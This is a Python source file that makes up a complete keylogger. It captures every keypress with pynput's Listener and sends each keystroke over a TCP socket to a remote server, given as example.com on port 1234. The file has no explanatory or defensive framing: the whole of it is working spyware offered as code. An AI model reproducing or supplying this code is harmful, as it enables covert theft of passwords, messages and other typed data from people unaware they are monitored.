import socket
from pynput.keyboard import Listener
import logging

logger = logging.getLogger(__name__)
logger.setLevel(logging.ERROR)
handler = logging.FileHandler('keylogger.log')
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

def send_to_server(server_hostname, port, data):
    
    try:
        server_ip = socket.gethostbyname(server_hostname)
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, port))
        client_socket.send(data.encode())
    except Exception as e:
        logger.error('Error sending data to the server: {}'.format(e))
    finally:
        client_socket.close()

def write_to_file(key):
    keydata = str(key).replace("'", "")
    send_to_server("example.com", 1234, keydata)

try:
    with Listener(on_press=write_to_file) as listener:
        listener.join()
except Exception as e:
    logger.error('Error: {}'.format(e))
